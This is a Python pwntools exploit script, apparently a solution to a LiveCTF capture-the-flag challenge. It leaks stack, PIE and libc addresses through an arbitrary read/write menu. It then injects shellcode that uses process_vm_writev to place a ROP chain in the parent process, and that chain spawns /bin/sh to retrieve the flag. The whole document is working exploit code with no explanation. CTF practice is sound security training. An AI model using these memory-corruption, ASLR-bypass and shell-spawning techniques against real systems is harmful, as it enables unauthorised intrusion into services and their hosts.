#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")

context.binary = exe

#io = gdb.debug([exe.path], '''
#    set follow-fork-mode parent
#    #set follow-fork-mode child
#    brva 0x147A
#''')

# io = process([exe.path])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def read64(addr: int):
    io.sendlineafter("Choice:", "1")
    io.sendlineafter(':', f'{addr:#x}')
    io.recvuntil(': ')
    val = int(io.recvline().decode()[:-1], 16)
    return val

def write64(addr: int, val: int):
    io.sendlineafter("Choice:", "2")
    io.sendlineafter(':', f'{val:#x}')
    io.sendlineafter(':', f'{addr:#x}')


stack_leak = read64(0)
log.info(f'{stack_leak:#x}')

target = stack_leak - 0x120
pie_leak = read64(target)
log.info(f'{pie_leak:#x}')

exe.address = (pie_leak & ~0xfff) - 0x1000
log.info(f'{exe.address:#x}')

libc_leak = read64(exe.got['fork'])
libc.address = libc_leak - 0xea6a0
log.info(f'{libc_leak:#x}')
log.info(f'{libc.address:#x}')


sc_start = exe.address + 0x1488

sc = asm('nop')*0x10

binsh = next(libc.search(b"/bin/sh"))
rop = ROP(libc)
rop.execve(binsh, 0, 0)
a = rop.chain()

print(hexdump(a))

def writev_helper(addr: int, data: bytes):
    go = f"""
        getppid:
        mov rax, 110
        syscall

        mov rdi, rax

        lea rsi, [rip + src]
        mov rdx, 1

        lea r10, [rip + dst]
        mov r8, 1

        mov r9, 0
        mov rax, 311
        syscall

    lol:
        jmp lol


    src:
        .8byte {sc_start+0x100:#x}
        .8byte {len(data):#x}
        .8byte 0
        .8byte 0
    dst: 
        .8byte {(addr):#x}
        .8byte {len(data):#x}
        .8byte 0
        .8byte 0

    """
    return asm(go)

#sc = writev_helper + go

chain = rop.chain()
#chain = b'Q'*0x40

ret_parent_addr = stack_leak - 0x130

sc += writev_helper(ret_parent_addr, chain)
sc += b'A'*8

sc = sc.ljust(0x100, b'A')
#sc += p64(sc_start + 0x108)
sc += chain


for i in range(0, len(sc), 8):
    write64(sc_start + i, u64(sc[i:i+8]))

# trigger
write64(exe.address + 0x1484, u64(asm('nop')*8))

import time
time.sleep(1)
io.sendlineafter(":", "3")
io.sendline('./submitter')

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
print(f'Flag: {flag}')
